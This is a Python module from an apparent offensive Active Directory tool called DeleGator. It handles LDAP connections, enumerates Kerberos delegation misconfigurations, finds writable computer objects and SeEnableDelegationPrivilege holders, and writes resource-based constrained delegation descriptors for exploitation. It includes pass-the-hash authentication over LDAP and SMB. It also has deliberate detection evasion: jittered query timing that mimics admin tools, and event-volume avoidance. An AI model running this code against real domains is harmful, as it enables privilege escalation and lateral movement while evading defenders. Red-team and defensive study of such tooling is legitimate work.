"""
core/ldap.py

LDAP connection management and query primitives for DeleGator.

OPSEC design principles:
  - Kerberos authentication is preferred over NTLM. NTLM auth against
    LDAP generates additional events and is increasingly flagged by
    modern detection rules. Kerberos is used wherever the auth context
    supports it and NTLM is an explicit fallback only.

  - All queries use targeted LDAP filters. No broad (objectClass=*)
    style dumps that pull the entire directory and generate high
    Event ID 4662 volume. Every filter is scoped to exactly the
    attributes needed for that query.

  - Queries are issued through a single rate-limited method that
    applies configurable delay and jitter between requests. This
    keeps query timing within the range of normal LDAP traffic
    patterns rather than machine-speed enumeration.

  - Search bases are scoped to the minimum required container where
    possible (e.g. CN=Computers rather than the full DC root) to
    reduce the breadth of directory access events generated.
"""

import sys
import time
import random
import ssl
from typing import Optional, Generator, Any

import ldap3
import struct
from ldap3 import (
    Server, Connection, NTLM, KERBEROS, SASL,
    SUBTREE, ALL_ATTRIBUTES, SIMPLE, AUTO_BIND_NO_TLS,
    Tls
)
from ldap3.core.exceptions import (
    LDAPBindError,
    LDAPSocketOpenError,
    LDAPSocketReceiveError,
    LDAPOperationResult,
    LDAPException,
)

from .auth import AuthContext, AuthMethod


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# Default LDAP attributes we pull for delegation enumeration.
# Keeping this list tight reduces response size and event noise.
DELEGATION_ATTRS = [
    "sAMAccountName",
    "distinguishedName",
    "objectClass",
    "userAccountControl",
    "msDS-AllowedToDelegateTo",
    "msDS-AllowedToActOnBehalfOfOtherIdentity",
    "servicePrincipalName",
    "pwdLastSet",
    "lastLogonTimestamp",
    "operatingSystem",
]

ACL_ATTRS = [
    "sAMAccountName",
    "distinguishedName",
    "nTSecurityDescriptor",
    "objectClass",
]

COMPUTER_ATTRS = [
    "sAMAccountName",
    "distinguishedName",
    "userAccountControl",
    "operatingSystem",
    "operatingSystemVersion",
    "lastLogonTimestamp",
    "servicePrincipalName",
    "msDS-AllowedToDelegateTo",
    "msDS-AllowedToActOnBehalfOfOtherIdentity",
]

USER_ATTRS = [
    "sAMAccountName",
    "distinguishedName",
    "userAccountControl",
    "servicePrincipalName",
    "msDS-AllowedToDelegateTo",
    "pwdLastSet",
    "memberOf",
]


# ---------------------------------------------------------------------------
# OpsecConfig — controls query timing behaviour
# ---------------------------------------------------------------------------

class OpsecConfig:
    """
    Controls timing and noise behaviour for LDAP queries.

    delay_ms:   Base delay between queries in milliseconds.
                Default 0 (no delay) for speed during development.
                Set to 500-2000ms for production OPSEC use.

    jitter_pct: Percentage of delay_ms to randomise by.
                e.g. delay=1000, jitter=20 means each delay is
                between 800ms and 1200ms. Prevents rhythmic query
                patterns that statistical detection can fingerprint.

    slow:       Preset that sets delay=2000, jitter=30. Mimics
                the query cadence of legitimate AD management tools.
    """

    def __init__(
        self,
        delay_ms:   int  = 0,
        jitter_pct: int  = 0,
        slow:       bool = False,
    ):
        if slow:
            self.delay_ms   = 2000
            self.jitter_pct = 30
        else:
            self.delay_ms   = delay_ms
            self.jitter_pct = max(0, min(jitter_pct, 100))

    def sleep(self) -> None:
        """Sleep for delay_ms +/- jitter before the next query."""
        if self.delay_ms == 0:
            return
        jitter_range = int(self.delay_ms * (self.jitter_pct / 100))
        actual_delay = self.delay_ms + random.randint(-jitter_range, jitter_range)
        time.sleep(max(0, actual_delay) / 1000.0)

    def __repr__(self) -> str:
        return (
            f"OpsecConfig(delay={self.delay_ms}ms, "
            f"jitter={self.jitter_pct}%)"
        )


# ---------------------------------------------------------------------------
# LDAPConnection — wraps ldap3 and exposes query primitives
# ---------------------------------------------------------------------------

class LDAPConnection:
    """
    Manages a single authenticated LDAP connection to a domain controller.

    Consumers should use the factory function `connect()` rather than
    instantiating this class directly.
    """

    def __init__(
        self,
        conn:        Connection,
        base_dn:     str,
        domain:      str,
        dc_ip:       str,
        opsec:       OpsecConfig,
        auth:        Optional["AuthContext"] = None,
    ):
        self._conn   = conn
        self.base_dn = base_dn
        self.domain  = domain
        self.dc_ip   = dc_ip
        self.opsec   = opsec
        self._auth   = auth   # retained for SMB ops (SYSVOL reads, etc.)

    # ------------------------------------------------------------------
    # Internal query method — all public query methods funnel through here
    # ------------------------------------------------------------------

    def _query(
        self,
        search_filter: str,
        attributes:    list[str],
        search_base:   Optional[str] = None,
        scope:         Any           = SUBTREE,
        use_sd_control: bool         = False,
    ) -> list[dict]:
        """
        Execute a single LDAP query and return a list of entry dicts.

        Applies opsec delay before each query. Uses the provided
        search_base or falls back to the domain root base_dn.
        Exits cleanly on LDAP errors rather than throwing exceptions
        up to the caller.

        use_sd_control: when True, adds the LDAP_SERVER_SD_FLAGS_OID
        control to request nTSecurityDescriptor in the response.
        Required for reading security descriptors on AD objects.
        Without this control Windows silently omits the attribute.
        """
        self.opsec.sleep()

        base     = search_base or self.base_dn
        controls = None

        if use_sd_control:
            # LDAP_SERVER_SD_FLAGS_OID = 1.2.840.113556.1.4.801
            # Request DACL_SECURITY_INFORMATION (0x04) only — sufficient
            # for reading write permissions without triggering SACL access
            # BER encoding of INTEGER value 4: 30 03 02 01 04
            sd_flags_value = bytes([0x30, 0x03, 0x02, 0x01, 0x04])
            controls = [("1.2.840.113556.1.4.801", True, sd_flags_value)]

        try:
            self._conn.search(
                search_base=base,
                search_filter=search_filter,
                search_scope=scope,
                attributes=attributes,
                controls=controls,
            )
        except LDAPOperationResult as e:
            _die(f"LDAP query failed: {e}")
        except LDAPSocketReceiveError as e:
            _die(f"LDAP connection lost mid-query: {e}")
        except LDAPException as e:
            _die(f"Unexpected LDAP error: {e}")

        results = []
        for entry in self._conn.entries:
            entry_dict = {"dn": entry.entry_dn}
            for attr in attributes:
                try:
                    val = entry[attr].value
                    entry_dict[attr] = val
                except Exception:
                    entry_dict[attr] = None
            results.append(entry_dict)

        return results

    # ------------------------------------------------------------------
    # Domain metadata
    # ------------------------------------------------------------------

    def get_domain_info(self) -> dict:
        """
        Pull basic domain metadata from server info collected at
        connection time (get_info=ldap3.ALL). No additional query
        needed so this generates zero extra log noise.
        """
        try:
            info = self._conn.server.info
            if not info:
                return {}

            def _first(val):
                if val is None:
                    return ""
                if isinstance(val, (list, tuple)):
                    return str(val[0]) if val else ""
                return str(val)

            return {
                "base_dn":              _first(info.other.get("defaultNamingContext")),
                "domain_functionality": _first(info.other.get("domainFunctionality")),
                "forest_functionality": _first(info.other.get("forestFunctionality")),
                "dc_hostname":          _first(info.other.get("dnsHostName")),
            }
        except Exception:
            return {}

    # ------------------------------------------------------------------
    # Delegation enumeration queries
    # ------------------------------------------------------------------

    def get_unconstrained_computers(self) -> list[dict]:
        """
        Find computer accounts with unconstrained delegation configured.

        Filter explanation:
          (&
            (objectCategory=computer)          only computer objects
            (userAccountControl:1.2.840...=524288)  TRUSTED_FOR_DELEGATION flag
            (!(userAccountControl:1.2.840...=8192))  exclude DCs (SERVER_TRUST_ACCOUNT)
          )

        Excluding DCs is important — they legitimately have this flag set
        and including them would generate false positives in the output.
        The OID 1.2.840.113556.1.4.803 is the LDAP_MATCHING_RULE_BIT_AND
        operator used to test individual bits in userAccountControl.
        """
        # TRUSTED_FOR_DELEGATION = 0x80000 = 524288
        # SERVER_TRUST_ACCOUNT   = 0x2000  = 8192 (domain controllers)
        search_filter = (
            "(&"
            "(objectCategory=computer)"
            "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            "(!(userAccountControl:1.2.840.113556.1.4.803:=8192))"
            ")"
        )
        return self._query(search_filter, COMPUTER_ATTRS)

    def get_constrained_accounts(self) -> list[dict]:
        """
        Find accounts (users and computers) with constrained delegation
        configured via msDS-AllowedToDelegateTo.

        Returns both user and computer accounts since constrained
        delegation can be configured on either object type.
        """
        search_filter = (
            "(&"
            "(|(objectCategory=user)(objectCategory=computer)"
            "(objectClass=msDS-GroupManagedServiceAccount))"
            "(msDS-AllowedToDelegateTo=*)"
            ")"
        )
        return self._query(search_filter, DELEGATION_ATTRS)

    def get_rbcd_configured(self) -> list[dict]:
        """
        Find computer accounts that already have RBCD configured,
        i.e. msDS-AllowedToActOnBehalfOfOtherIdentity is populated.

        This covers cases where RBCD has already been set by an admin
        or by a previous attacker — both worth surfacing in the output.
        """
        search_filter = (
            "(&"
            "(objectCategory=computer)"
            "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
            ")"
        )
        return self._query(search_filter, COMPUTER_ATTRS)

    def get_protocol_transition_accounts(self) -> list[dict]:
        """
        Find accounts with both constrained delegation AND protocol
        transition enabled (TRUSTED_TO_AUTH_FOR_DELEGATION flag).

        This is the most exploitable constrained delegation variant
        since it allows S4U2Self without needing the target user's TGT.
        TRUSTED_TO_AUTH_FOR_DELEGATION = 0x1000000 = 16777216
        """
        search_filter = (
            "(&"
            "(|(objectCategory=user)(objectCategory=computer)"
            "(objectClass=msDS-GroupManagedServiceAccount))"
            "(msDS-AllowedToDelegateTo=*)"
            "(userAccountControl:1.2.840.113556.1.4.803:=16777216)"
            ")"
        )
        return self._query(search_filter, DELEGATION_ATTRS)

    # ------------------------------------------------------------------
    # ACL / write permission queries (for RBCD setup path)
    # ------------------------------------------------------------------

    def get_computers_writable_by(self, account_sid: str) -> list[dict]:
        """
        Find computer objects where the specified account SID has
        write permissions that could be used to configure RBCD.

        Uses the LDAP_SERVER_SD_FLAGS_OID control to request
        nTSecurityDescriptor. Searches full domain including
        CN=Managed Service Accounts to catch gMSA objects.
        """
        search_filter = (
            "(|"
            "(objectCategory=computer)"
            "(objectClass=msDS-GroupManagedServiceAccount)"
            ")"
        )
        return self._query(
            search_filter,
            ACL_ATTRS + ["sAMAccountName", "distinguishedName"],
            search_base=self.base_dn,
            use_sd_control=True,
        )

    def get_group_members_recursive(self, group_dn: str) -> list[str]:
        """
        Recursively resolve all member SIDs of a group including
        nested group membership. Returns a flat list of SID strings.
        Used for RBCD write path detection where permissions are
        granted to a group rather than directly to the user account.
        """
        seen_dns  = set()
        all_sids  = []

        def _resolve(dn: str) -> None:
            if dn in seen_dns:
                return
            seen_dns.add(dn)

            results = self._query(
                f"(distinguishedName={dn})",
                ["member", "objectSid", "objectClass"],
            )
            if not results:
                return

            entry      = results[0]
            obj_class  = str(entry.get("objectClass", "")).lower()
            obj_sid    = entry.get("objectSid")

            # If this is a user/computer, collect its SID
            if obj_sid and "group" not in obj_class:
                all_sids.append(str(obj_sid))

            # Recurse into members
            members = entry.get("member") or []
            if isinstance(members, str):
                members = [members]
            for member_dn in (members or []):
                _resolve(str(member_dn))

        _resolve(group_dn)
        return all_sids

    def get_account_sid_and_groups(self, samname: str) -> tuple[Optional[str], list[str]]:
        """
        Return (objectSid, [group_dns]) for an account including
        built-in group memberships not stored in memberOf attribute.
        """
        results = self._query(
            f"(sAMAccountName={samname})",
            ["objectSid", "memberOf", "distinguishedName"],
        )
        if not results:
            results = self._query(
                f"(sAMAccountName={samname.rstrip('$') + '$'})",
                ["objectSid", "memberOf", "distinguishedName"],
            )
        if not results:
            return None, []

        entry     = results[0]
        sid       = str(entry.get("objectSid")) if entry.get("objectSid") else None
        dn        = entry.get("distinguishedName") or entry.get("dn", "")
        member_of = entry.get("memberOf") or []
        if isinstance(member_of, str):
            member_of = [member_of]
        member_of = list(member_of or [])

        # Also query which groups this account is a member of directly
        # This catches built-in groups (Account Operators, etc.) that
        # don't appear in the memberOf attribute on the user object
        if dn:
            group_results = self._query(
                f"(&(objectClass=group)(member={dn}))",
                ["distinguishedName", "objectSid"],
            )
            for g in (group_results or []):
                g_dn = g.get("distinguishedName") or g.get("dn", "")
                if g_dn and g_dn not in member_of:
                    member_of.append(g_dn)

        return sid, member_of

    def get_account_by_samname(self, samname: str) -> Optional[dict]:
        """
        Look up a single account by sAMAccountName.
        Used to resolve account details when building attack path output.
        """
        search_filter = f"(sAMAccountName={samname})"
        results = self._query(search_filter, USER_ATTRS + COMPUTER_ATTRS)
        return results[0] if results else None

    def get_account_sid(self, samname: str) -> Optional[str]:
        """
        Return the objectSid for an account as a string.
        Used when building the RBCD security descriptor.
        """
        search_filter = f"(sAMAccountName={samname})"
        results = self._query(search_filter, ["objectSid", "sAMAccountName"])
        if not results:
            return None
        sid = results[0].get("objectSid")
        return str(sid) if sid else None

    def get_domain_controllers(self) -> list[dict]:
        """
        Return all domain controller computer accounts.
        Used to exclude DCs from unconstrained delegation results
        and to identify high-value delegation targets.
        SERVER_TRUST_ACCOUNT = 0x2000 = 8192
        """
        search_filter = (
            "(&"
            "(objectCategory=computer)"
            "(userAccountControl:1.2.840.113556.1.4.803:=8192)"
            ")"
        )
        return self._query(search_filter, COMPUTER_ATTRS)

    def get_delegation_privilege_holders(self) -> dict:
        """
        Identify accounts and groups that hold SeEnableDelegationPrivilege
        in the domain.

        SeEnableDelegationPrivilege is a domain-level right assigned via
        the Default Domain Controllers Policy GPO. Holding it allows an
        account to set the TRUSTED_FOR_DELEGATION or
        TRUSTED_TO_AUTH_FOR_DELEGATION flags on any account object — i.e.
        to create a delegation attack path from scratch on any account
        they control.

        Method:
          1. Locate the Default Domain Controllers Policy GPO by querying
             for its well-known displayName under CN=Policies,CN=System.
          2. Read gPCFileSysPath to get the UNC path to GptTmpl.inf.
          3. Fetch GptTmpl.inf from the SYSVOL share via LDAP-adjacent
             SMB — or fall back to reading the raw GPO attribute if the
             file path is not reachable.
          4. Parse the [Privilege Rights] section for SeEnableDelegationPrivilege.
          5. Resolve each SID/account name in that list back to a
             sAMAccountName and objectClass for display.

        Returns a dict:
          {
            "gpo_path":   str | None,          # UNC path to GptTmpl.inf
            "raw_value":  str | None,          # raw privilege entry
            "holders": [
              {
                "sid":          str,
                "sAMAccountName": str | None,
                "objectClass":  str | None,
                "is_group":     bool,
                "member_count": int | None,    # only for groups
              },
              ...
            ],
          }

        OPSEC note:
          Reads one GPO object attribute (gPCFileSysPath) — a single
          targeted LDAP query. Lower noise than a full GPO dump.
          The GptTmpl.inf read is a standard SYSVOL file access.
        """
        result = {
            "gpo_path":  None,
            "raw_value": None,
            "holders":   [],
        }

        # Step 1 — Find the Default Domain Controllers Policy GPO
        policies_base = f"CN=Policies,CN=System,{self.base_dn}"
        gpo_results = self._query(
            "(&(objectClass=groupPolicyContainer)"
            "(displayName=Default Domain Controllers Policy))",
            ["distinguishedName", "gPCFileSysPath"],
            search_base=policies_base,
        )

        if not gpo_results:
            # Fallback: search from domain root in case of non-default structure
            gpo_results = self._query(
                "(&(objectClass=groupPolicyContainer)"
                "(displayName=Default Domain Controllers Policy))",
                ["distinguishedName", "gPCFileSysPath"],
            )

        if not gpo_results:
            return result

        gpc_path = gpo_results[0].get("gPCFileSysPath")
        if not gpc_path:
            return result

        result["gpo_path"] = str(gpc_path)

        # Step 2 — Fetch GptTmpl.inf from SYSVOL via SMB
        # Path format: \\domain\SYSVOL\domain\Policies\{GUID}\MACHINE\
        #              Microsoft\Windows NT\SecEdit\GptTmpl.inf
        inf_path = str(gpc_path).rstrip("\\") + (
            "\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf"
        )
        raw_value = self._read_gpttmpl_privilege(inf_path)

        if not raw_value:
            return result

        result["raw_value"] = raw_value

        # Step 3 — Parse the SID/name list from the privilege entry
        # Format: SeEnableDelegationPrivilege = *S-1-5-32-544,*S-1-5-21-...-512
        # Entries can be bare SIDs (prefixed *) or account names
        entries = [e.strip().lstrip("*") for e in raw_value.split(",")]

        for entry in entries:
            if not entry:
                continue

            holder: dict = {
                "sid":            entry if entry.startswith("S-1-") else None,
                "sAMAccountName": None,
                "objectClass":    None,
                "is_group":       False,
                "member_count":   None,
            }

            if entry.startswith("S-1-"):
                # Resolve SID → account info
                acct = self._query(
                    f"(objectSid={entry})",
                    ["sAMAccountName", "objectClass", "member"],
                )
            else:
                # Plain account name
                acct = self._query(
                    f"(sAMAccountName={entry})",
                    ["sAMAccountName", "objectClass", "member", "objectSid"],
                )

            if acct:
                a = acct[0]
                holder["sAMAccountName"] = a.get("sAMAccountName")
                if not holder["sid"]:
                    holder["sid"] = str(a.get("objectSid", "")) or None

                obj_class = a.get("objectClass")
                classes = (
                    obj_class if isinstance(obj_class, list) else [obj_class]
                ) if obj_class else []
                class_str = " ".join(str(c) for c in classes).lower()
                holder["objectClass"] = class_str
                holder["is_group"]    = "group" in class_str

                if holder["is_group"]:
                    members = a.get("member") or []
                    if isinstance(members, str):
                        members = [members]
                    holder["member_count"] = len(members)
            else:
                # Could not resolve — keep raw value as best effort
                holder["sAMAccountName"] = entry

            result["holders"].append(holder)

        return result

    def _read_gpttmpl_privilege(self, unc_path: str) -> Optional[str]:
        """
        Read GptTmpl.inf from a SYSVOL UNC path and extract the
        SeEnableDelegationPrivilege line from [Privilege Rights].

        Uses impacket's SMBConnection authenticated with the same
        credentials that established the LDAP session. Anonymous SYSVOL
        access is blocked on most modern domains so we always use real
        credentials here.

        Authentication priority mirrors the LDAP auth order:
          1. NTLM hash  (pass-the-hash)
          2. Password   (NTLM)
          3. ccache     (Kerberos via KRB5CCNAME env var)
          4. Anonymous  (last resort — will fail on hardened targets)

        Returns the raw value string (everything after the '='),
        or None if the file cannot be read or the privilege is absent.
        """
        try:
            from impacket.smbconnection import SMBConnection

            # Parse \\server\share\path from UNC
            # e.g. \\dc.domain.com\SYSVOL\domain\Policies\{GUID}\...
            parts = unc_path.lstrip("\\").split("\\")
            if len(parts) < 3:
                return None

            server    = parts[0]
            share     = parts[1]
            file_path = "\\" + "\\".join(parts[2:])

            smb = SMBConnection(server, self.dc_ip)

            # Authenticate using stored auth context
            a = self._auth
            if a is not None:
                method = a.auth_method.name
                if method == "HASH":
                    smb.login(
                        a.username,
                        "",
                        a.domain,
                        lmhash=a.lm_hash or "",
                        nthash=a.nt_hash or "",
                    )
                elif method == "PASSWORD":
                    smb.login(a.username, a.password or "", a.domain)
                elif method in ("CCACHE", "CERT"):
                    # Kerberos — SMBConnection picks up KRB5CCNAME from env
                    # which connect() already set when building the LDAP session
                    smb.kerberosLogin(
                        a.username,
                        "",
                        a.domain,
                        "",
                        "",
                        useCache=True,
                    )
                else:
                    smb.login("", "", "", "", "")
            else:
                smb.login("", "", "", "", "")

            buf = []
            smb.getFile(share, file_path, buf.append)
            smb.logoff()

            content = b"".join(buf).decode("utf-16-le", errors="replace")

            for line in content.splitlines():
                if "SeEnableDelegationPrivilege" in line:
                    _, _, value = line.partition("=")
                    return value.strip() or None

        except Exception:
            # Silently fail — SYSVOL unreachable, auth rejected, etc.
            # The caller surfaces a partial result rather than crashing.
            pass

        return None

    # ------------------------------------------------------------------
    # Write operations (used by exploitation modules)
    # ------------------------------------------------------------------

    def write_rbcd(self, target_dn: str, security_descriptor: bytes) -> bool:
        """
        Write a security descriptor to msDS-AllowedToActOnBehalfOfOtherIdentity
        on the target computer object to configure RBCD.

        Returns True on success, exits on failure.
        This operation generates Event ID 5136 (directory service object
        modified) on the DC which is the primary RBCD detection event.
        """
        self.opsec.sleep()

        try:
            self._conn.modify(
                target_dn,
                {
                    "msDS-AllowedToActOnBehalfOfOtherIdentity": [
                        (ldap3.MODIFY_REPLACE, [security_descriptor])
                    ]
                },
            )
        except LDAPException as e:
            _die(f"Failed to write RBCD attribute to '{target_dn}': {e}")

        if self._conn.result["result"] == 0:
            return True

        result_desc = self._conn.result.get("description", "unknown error")
        _die(
            f"LDAP modify failed for '{target_dn}': {result_desc}\n"
            "  This usually means the authenticated account lacks "
            "write access to the target computer object."
        )

    def clear_rbcd(self, target_dn: str) -> bool:
        """
        Remove msDS-AllowedToActOnBehalfOfOtherIdentity from a computer object.
        Used to clean up after exploitation during testing.
        """
        self.opsec.sleep()

        try:
            self._conn.modify(
                target_dn,
                {
                    "msDS-AllowedToActOnBehalfOfOtherIdentity": [
                        (ldap3.MODIFY_DELETE, [])
                    ]
                },
            )
        except LDAPException as e:
            _die(f"Failed to clear RBCD attribute on '{target_dn}': {e}")

        return self._conn.result["result"] == 0

    # ------------------------------------------------------------------
    # Utility
    # ------------------------------------------------------------------

    def domain_to_base_dn(self) -> str:
        """Return the current base DN."""
        return self.base_dn

    def close(self) -> None:
        """Cleanly close the LDAP connection."""
        try:
            self._conn.unbind()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _die(message: str) -> None:
    print(f"\n  [!] LDAP error: {message}\n", file=sys.stderr)
    sys.exit(1)


def _domain_to_base_dn(domain: str) -> str:
    """Convert delegator.lab to DC=delegator,DC=lab"""
    parts = domain.lower().strip(".").split(".")
    return ",".join(f"DC={part}" for part in parts)


def _build_server(dc_ip: str, use_ssl: bool = False) -> Server:
    """
    Build an ldap3 Server object.
    SSL is optional — most internal AD environments don't require LDAPS
    and forcing it adds complexity without OPSEC benefit in a lab context.
    Port 636 for LDAPS, 389 for plain LDAP.
    """
    port = 636 if use_ssl else 389

    if use_ssl:
        tls = Tls(validate=ssl.CERT_NONE)
        return Server(dc_ip, port=port, use_ssl=True, tls=tls, get_info=ldap3.ALL)

    return Server(dc_ip, port=port, get_info=ldap3.ALL)


def _bind_ntlm(
    server:   Server,
    auth:     AuthContext,
    domain:   str,
) -> Connection:
    """
    Establish an NTLM-authenticated LDAP bind.
    Used as fallback when Kerberos is not available.
    """
    ntlm_user = f"{domain.upper()}\\{auth.username}"

    if auth.auth_method.name == "HASH":
        # Pass-the-hash: construct the password string Impacket/ldap3 expects
        password = f"{auth.lm_hash}:{auth.nt_hash}"
    else:
        password = auth.password or ""

    conn = Connection(
        server,
        user=ntlm_user,
        password=password,
        authentication=NTLM,
        auto_bind=AUTO_BIND_NO_TLS,
    )

    if not conn.bind():
        result = conn.result.get("description", "unknown")
        _die(
            f"NTLM LDAP bind failed for '{ntlm_user}': {result}\n"
            "  Check credentials and that the account is not locked."
        )

    return conn


def _bind_simple(
    server:   Server,
    auth:     AuthContext,
    base_dn:  str,
) -> Connection:
    """
    Simple bind using UPN format.
    Less preferred than NTLM or Kerberos but included as a fallback.
    """
    conn = Connection(
        server,
        user=auth.upn,
        password=auth.password or "",
        authentication=SIMPLE,
        auto_bind=AUTO_BIND_NO_TLS,
    )

    if not conn.bind():
        result = conn.result.get("description", "unknown")
        _die(
            f"Simple LDAP bind failed for '{auth.upn}': {result}\n"
            "  Check credentials and domain reachability."
        )

    return conn


# ---------------------------------------------------------------------------
# Public factory function
# ---------------------------------------------------------------------------

def connect(
    auth:       AuthContext,
    dc_ip:      str,
    domain:     Optional[str] = None,
    use_ssl:    bool          = False,
    opsec:      Optional[OpsecConfig] = None,
) -> LDAPConnection:
    """
    Establish an authenticated LDAP connection to a domain controller
    and return an LDAPConnection ready for queries.

    Authentication preference order:
      1. Kerberos (ccache or cert) — lowest noise, preferred
      2. NTLM hash — pass-the-hash, moderate noise
      3. NTLM password — standard, moderate noise
      4. Simple bind — highest noise, last resort

    Args:
        auth:    AuthContext from core/auth.py
        dc_ip:   IP address or hostname of the domain controller
        domain:  Domain FQDN. Defaults to auth.domain if not provided.
        use_ssl: Connect on port 636 with LDAPS. Default False.
        opsec:   OpsecConfig controlling query timing. Default no delay.

    Returns:
        LDAPConnection ready for queries.
    """
    resolved_domain = (domain or auth.domain).lower()
    base_dn = _domain_to_base_dn(resolved_domain)
    opsec   = opsec or OpsecConfig()
    server  = _build_server(dc_ip, use_ssl)

    auth_method = auth.auth_method.name

    # Kerberos authentication (ccache or certificate)
    if auth_method in ("CCACHE", "CERT"):
        if auth_method == "CCACHE":
            import os
            # Point Kerberos library at the ccache
            os.environ["KRB5CCNAME"] = auth.ccache_path

        try:
            # Try plain Kerberos first, fall back to TLS-before-bind
            # for environments that enforce strongerAuthRequired (LDAP signing)
            # When use_ssl=True, TLS is handled at transport layer (port 636)
            # so the bind itself uses AUTO_BIND_NO_TLS — TLS is already active
            conn = Connection(
                server,
                user=auth.upn,
                authentication=SASL,
                sasl_mechanism=KERBEROS,
                auto_bind=AUTO_BIND_NO_TLS,
            )
            if not conn.bind():
                result = conn.result.get("description", "unknown")
                _die(
                    f"Kerberos LDAP bind failed for '{auth.upn}': {result}\n"
                    "  Ensure the ticket is valid and has not expired.\n"
                    "  Try: klist to inspect the current ccache."
                )
            if not conn.bind():
                result = conn.result.get("description", "unknown")
                _die(
                    f"Kerberos LDAP bind failed for '{auth.upn}': {result}\n"
                    "  Ensure the ticket is valid and has not expired.\n"
                    "  Try: klist to inspect the current ccache."
                )
        except LDAPSocketOpenError:
            _die(
                f"Cannot reach domain controller at {dc_ip}:{636 if use_ssl else 389}.\n"
                "  Check the IP is correct and the host is reachable."
            )
        except LDAPException as e:
            _die(f"Kerberos LDAP connection failed: {e}")

    # NTLM hash or password authentication
    elif auth_method in ("HASH", "PASSWORD"):
        try:
            conn = _bind_ntlm(server, auth, resolved_domain)
        except LDAPSocketOpenError:
            _die(
                f"Cannot reach domain controller at {dc_ip}:{636 if use_ssl else 389}.\n"
                "  Check the IP is correct and the host is reachable."
            )

    else:
        _die(f"Unsupported auth method for LDAP: {auth_method}")

    return LDAPConnection(
        conn=conn,
        base_dn=base_dn,
        domain=resolved_domain,
        dc_ip=dc_ip,
        opsec=opsec,
        auth=auth,
    )
